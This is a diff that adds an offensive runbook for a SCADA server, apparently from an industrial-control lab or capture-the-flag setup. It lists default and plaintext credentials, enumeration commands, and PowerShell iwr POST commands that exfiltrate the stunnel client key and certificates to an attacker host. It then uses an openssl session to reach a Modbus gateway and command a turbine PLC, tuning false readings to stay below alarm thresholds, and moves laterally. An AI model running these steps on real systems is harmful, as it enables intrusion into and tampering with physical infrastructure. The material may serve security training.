@@ -1,0 +1,210 @@
+# Runbook: distribution-scada
+
+## Entry
+
+Two entry paths. The web interface is the faster credential harvest. SSH gives
+an interactive shell on the operational zone with access to the stunnel client
+key.
+
+### Web
+
+Port 8080. Default credentials set at installation and never changed.
+
+```powershell
+iwr -Uri http://10.10.2.20:8080/ -Headers @{Authorization="Basic YWRtaW46YWRtaW4="}
+```
+
+The `Authorization` header is `admin:admin` base64-encoded. The dashboard
+returns live plant state polled from the historian.
+
+```powershell
+curl -u admin:admin http://10.10.2.20:8080/config
+```
+
+The `/config` endpoint returns a plaintext credential dump: historian read
+credentials (`hist_read / history2017`), SMTP relay password (`plantmail123`),
+and the web credentials themselves. Added during commissioning for the monitoring
+integration and never removed.
+
+```powershell
+curl -u admin:admin http://10.10.2.20:8080/historian-pass
+```
+
+Proxies a historian `/report` query. Added by an engineer who kept forgetting
+the historian password. Also never removed.
+
+A bare `curl -I http://10.10.2.20:8080/` without credentials returns a 401 with
+`X-Powered-By: UU-SCADA/2.1 Flask/2.3 Python/3.11` on every response. Version
+disclosure before authentication.
+
+### SSH
+
+Credentials are documented in `engineering_notes.txt` on the engineering
+workstation and in `plc-access-2019.conf` in the 2019 backup archive.
+
+```
+ssh scada_admin@10.10.2.20
+```
+
+Password: `W1nd0ws@2016`. Drops into the Windows Server 2016 facade.
+
+## Identity and host enumeration
+
+```powershell
+whoami
+```
+
+Returns `ot.local\scada_admin`.
+
+```powershell
+hostname
+```
+
+Returns `SCADA-SRV01`.
+
+```powershell
+ipconfig
+```
+
+Single NIC at `10.10.2.20`. Operational zone only. No direct path to the
+control network, but the stunnel client on this host gives authenticated Modbus
+access to `uupl-modbus-gw:8502`, which forwards to the turbine PLC.
+
+```powershell
+netstat -ano
+```
+
+Port 22 (sshd), port 8080 (Flask). Stunnel is listening on `127.0.0.1:5020`.
+The `127.0.0.1:5020` socket is the local Modbus-over-TLS relay: anything written
+to it goes through the TLS tunnel to the gateway and arrives at the PLC as plain
+Modbus TCP.
+
+## Configuration file
+
+```powershell
+cat C:\SCADA\Config\scada.ini
+```
+
+The complete credential set for this host and its dependencies:
+
+- Historian: `hist_read / history2017`
+- Web interface: `admin / admin`
+- SMTP relay: `alarms@uupl.am / plantmail123`
+- SSH admin: `scada_admin / W1nd0ws@2016`, with a note that IT raised a ticket
+  to rotate it in 2022. The ticket was closed. It was not rotated.
+
+```powershell
+cat C:\SCADA\Config\alarm_recipients.txt
+```
+
+Notification email addresses for critical and warning alarms. Useful for
+understanding who gets paged when the process trips.
+
+## Scripts
+
+```powershell
+cat C:\SCADA\Scripts\send_alarm.bat
+```
+
+The SMTP alarm relay batch script. The password (`plantmail123`) is in a `set`
+statement. Same credential as in `scada.ini` and in `send_alarm.ps1` on the
+engineering workstation.
+
+```powershell
+cat C:\SCADA\Scripts\poll_historian.ps1
+```
+
+Historian query script. The historian credentials (`hist_read / history2017`)
+are hardcoded in the `$Pass` variable. The script queries all assets and prints
+the last reading for each.
+
+## Alarm log
+
+```powershell
+cat C:\SCADA\Logs\alarm_log_2026.txt
+```
+
+Trip events with timestamps, asset names, measured values, and trip thresholds.
+The log reveals the operational envelope: at what RPM the overspeed alarm fires,
+what voltage triggers a feeder trip, which feeders have historically been
+unstable. Useful for calibrating a false-reading injection to stay below the
+alarm threshold.
+
+## PSReadLine history
+
+```powershell
+cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+Prior sessions include historian API queries and an SSH session to the historian
+(`ssh hist_admin@10.10.2.10`). Confirms the historian is the primary data source
+and that the operator SSHes to it directly.
+
+## Desktop quick reference
+
+```powershell
+cat Desktop\README.txt
+```
+
+One-page reference card for the SCADA system: web URL, config path, historian
+address. Written for the operator; reads like a credential cheat sheet.
+
+## Stunnel client key (HEX-5103)
+
+This is the highest-value artefact on this host.
+
+The stunnel client authenticates to `uupl-modbus-gw:8502` using a client
+certificate. The key was set world-readable so the monitoring user could read
+it. The permission was never tightened. Risk accepted 2020, ticket HEX-5103.
+
+The cert files are in `C:\SCADA\Config\certs\`.
+
+```powershell
+dir C:\SCADA\Config\certs\
+```
+
+Three files: `client.crt`, `client.key`, `ca.crt`. The key is world-readable.
+
+```powershell
+cat C:\SCADA\Config\certs\client.key
+cat C:\SCADA\Config\certs\client.crt
+cat C:\SCADA\Config\certs\ca.crt
+```
+
+PEM blocks. Exfiltrate them to the attacker machine via `iwr`:
+
+```powershell
+iwr -Method POST -Uri http://10.10.0.5:9999/key -InFile C:\SCADA\Config\certs\client.key
+iwr -Method POST -Uri http://10.10.0.5:9999/crt -InFile C:\SCADA\Config\certs\client.crt
+iwr -Method POST -Uri http://10.10.0.5:9999/ca  -InFile C:\SCADA\Config\certs\ca.crt
+```
+
+Set up a listener on the attacker machine before sending. With all three files
+saved there, connect directly to the gateway, bypassing the SCADA application:
+
+From attacker machine:
+
+```
+openssl s_client -connect 10.10.2.50:8502 \
+    -tls1_2 -cipher 'DEFAULT@SECLEVEL=0' \
+    -cert /tmp/client.crt \
+    -key  /tmp/client.key \
+    -CAfile /tmp/ca.crt
+```
+
+With an authenticated TLS session open, forward Modbus commands to the PLC via
+socat or a Python script. The gateway verifies the client cert; the PLC sees
+plain Modbus TCP and has no further authentication.
+
+## Lateral movement
+
+The SCADA server is primarily a credential aggregation point. From here:
+
+```powershell
+ssh hist_admin@10.10.2.10
+ssh engineer@10.10.2.30
+```
+
+Both credentials are in `scada.ini`. The historian SSH opens the `/ingest`
+poisoning path. The engineering workstation SSH opens the control-zone Modbus
+path. The stunnel client key opens the gateway directly without needing either.
